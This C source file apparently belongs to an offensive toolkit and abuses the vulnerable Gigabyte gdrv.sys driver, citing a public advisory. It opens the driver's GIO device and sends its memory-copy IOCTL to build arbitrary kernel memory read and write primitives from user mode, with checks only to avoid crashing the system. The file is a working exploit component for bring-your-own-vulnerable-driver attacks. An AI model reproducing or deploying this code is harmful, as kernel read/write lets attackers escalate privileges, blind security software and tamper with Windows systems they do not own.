// Details are available here : https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-of-privilege-vulnerabilities/
#include "PrintFunctions.h"
#include "DriverGDRV.h"
#include <windows.h>
#include <assert.h>
#include <tchar.h>

/*
* "gdrv.sys" (SHA256: 31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427)
*/

struct GDRV_MEMORY_READ {
    DWORD64 Dst;
    DWORD64 Src;
    DWORD ReadSize;
};

struct GDRV_MEMORY_WRITE {
    DWORD64 Dst;
    DWORD64 Src;
    DWORD WriteSize;
};

//#define IOCTL_GIO_MEMCPY 0xC3502808
static const DWORD GDRV_MEMORY_READ_CODE = 0xC3502808;
static const DWORD GDRV_MEMORY_WRITE_CODE = 0xC3502808;

HANDLE g_Device_GDRV = INVALID_HANDLE_VALUE;
HANDLE GetDriverHandle_GDRV() {
    if (g_Device_GDRV == INVALID_HANDLE_VALUE) {
        TCHAR service[] = TEXT("\\\\.\\GIO");
        HANDLE Device = CreateFile(service, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (Device == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] Unable to obtain a handle to the vulnerable driver, exiting...\n"));
            exit(EXIT_FAILURE);
        }
        g_Device_GDRV = Device;
    }
    return g_Device_GDRV;
}

VOID CloseDriverHandle_GDRV() {
    CloseHandle(g_Device_GDRV);
    g_Device_GDRV = INVALID_HANDLE_VALUE;
}


VOID ReadMemoryPrimitive_GDRV(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }
    if (Size < sizeof(BYTE) || Size > sizeof(DWORD64)) {
        _tprintf_or_not(TEXT("Unsupported size for read operation, aborting...\n"));
        exit(1);
    }
    //copy Size bytes from Src to Dest
    struct GDRV_MEMORY_READ ReadCommand = { 0 };
    ReadCommand.Src = Address;
    ReadCommand.Dst = (DWORD64) Buffer;
    ReadCommand.ReadSize = (DWORD) Size;

    DWORD BytesReturned=0;
    DeviceIoControl(GetDriverHandle_GDRV(),
        GDRV_MEMORY_READ_CODE,
        &ReadCommand,
        sizeof(ReadCommand),
        &ReadCommand,
        sizeof(ReadCommand),
        &BytesReturned,
        NULL);
}

VOID WriteMemoryPrimitive_GDRV(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }
    if (Size < sizeof(BYTE) || Size > sizeof(DWORD64)) {
        _putts_or_not(TEXT("Unsupported size for read operation, aborting...\n"));
        exit(1);
    }
    //copy Size bytes from Dest to Src
    struct GDRV_MEMORY_WRITE WriteCommand = { 0 };
    WriteCommand.Src = (DWORD64) Buffer;
    WriteCommand.Dst = Address;
    WriteCommand.WriteSize = (DWORD) Size;

    DWORD BytesReturned = 0;
    DeviceIoControl(GetDriverHandle_GDRV(),
        GDRV_MEMORY_WRITE_CODE,
        &WriteCommand,
        sizeof(WriteCommand),
        &WriteCommand,
        sizeof(WriteCommand),
        &BytesReturned,
        NULL);
}
